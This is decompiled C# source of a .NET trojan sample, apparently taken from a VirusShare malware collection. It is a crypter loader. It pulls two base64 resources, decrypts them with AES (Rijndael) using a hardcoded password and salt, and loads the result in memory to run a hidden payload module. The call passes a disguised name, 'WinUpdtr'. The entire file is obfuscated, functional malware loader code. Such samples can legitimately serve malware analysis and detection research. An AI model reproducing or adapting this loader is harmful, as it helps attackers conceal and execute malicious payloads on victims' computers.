// Decompiled with JetBrains decompiler
// Type: .
// Assembly: robin bs crypt, Version=10.1.2.5, Culture=neutral, PublicKeyToken=null
// MVID: BAD319E2-6DB4-4F14-9204-630EFEBB5941
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan.MSIL.Crypt.hek-546ce95f8cc1ad03325be45e6088f9c7d1044b9316e65a1c83d972dd3af136c0.exe

using \u0001;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0001
{
  internal sealed class \u0001
  {
    private static byte[] \u0001;
    private static byte[] \u0002;

    [STAThread]
    public static void \u0001()
    {
      while (!\u0002.\u0001())
      {
        if (true)
          return;
      }
      try
      {
        string str1 = \u0001.\u0001.\u0001("ResFile1");
        do
        {
          string str2 = \u0001.\u0001.\u0001("ResFile2");
          \u0001.\u0001.\u0001(str1, str2);
          string str3 = Convert.ToBase64String(\u0001.\u0001.\u0002) + "||SPLIT||FALSE||SPLIT||" + Assembly.GetExecutingAssembly().Location + "||SPLIT||WinUpdtr||SPLIT||";
          do
          {
            Assembly.Load(\u0001.\u0001.\u0001).GetType("CrpMod.CrpMod").GetMethods()[0].Invoke((object) null, new object[2]
            {
              (object) true,
              (object) str3
            });
          }
          while (false);
        }
        while (false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Console.WriteLine(ex.Message);
        ProjectData.ClearProjectError();
      }
    }

    public static byte[] \u0001([In] byte[] obj0, [In] string obj1)
    {
      Rijndael rijndael = Rijndael.Create();
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(obj1, new byte[16]
      {
        (byte) 38,
        (byte) 220,
        byte.MaxValue,
        (byte) 0,
        (byte) 173,
        (byte) 237,
        (byte) 122,
        (byte) 238,
        (byte) 197,
        (byte) 254,
        (byte) 7,
        (byte) 175,
        (byte) 77,
        (byte) 8,
        (byte) 34,
        (byte) 60
      });
      rijndael.Key = rfc2898DeriveBytes.GetBytes(32);
      MemoryStream memoryStream;
      if (true)
      {
        rijndael.IV = rfc2898DeriveBytes.GetBytes(16);
        memoryStream = new MemoryStream();
      }
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(obj0, 0, obj0.Length);
      cryptoStream.Close();
      return memoryStream.ToArray();
    }

    private static string \u0001([In] string obj0)
    {
      ResourceManager resourceManager = new ResourceManager("ChrmResFilerdr", Assembly.GetExecutingAssembly());
      string str = (string) resourceManager.GetObject(obj0);
      if (true)
        goto label_2;
label_1:
      return str;
label_2:
      resourceManager.ReleaseAllResources();
      goto label_1;
    }

    public static void \u0001([In] string obj0, [In] string obj1)
    {
      do
      {
        do
        {
          if (true)
            goto label_5;
label_1:
          continue;
label_5:
          \u0001.\u0001.\u0001 = \u0001.\u0001.\u0001(Convert.FromBase64String(obj0), "wCKVLYfE");
          goto label_1;
        }
        while (false);
        if (true)
          goto label_6;
label_4:
        continue;
label_6:
        \u0001.\u0001.\u0002 = \u0001.\u0001.\u0001(Convert.FromBase64String(obj1), "wCKVLYfE");
        goto label_4;
      }
      while (false);
    }
  }
}
